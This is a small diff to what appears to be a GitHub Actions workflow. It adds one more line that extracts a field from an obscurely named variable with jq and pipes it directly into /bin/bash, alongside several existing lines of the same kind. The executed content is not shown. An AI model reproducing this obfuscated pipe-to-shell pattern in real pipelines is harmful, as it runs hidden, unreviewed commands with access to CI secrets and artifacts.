@@ -28,6 +28,7 @@ jobs:
           echo $fz24 | jq -r .nfif04 | /bin/bash
           echo $s91288 | jq -r .xqd7 | /bin/bash
           printf '%s' "$x081" | jq -r .hfq00002 | /bin/bash
+          printf '%s' "$noh0" | jq -r .sb874 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
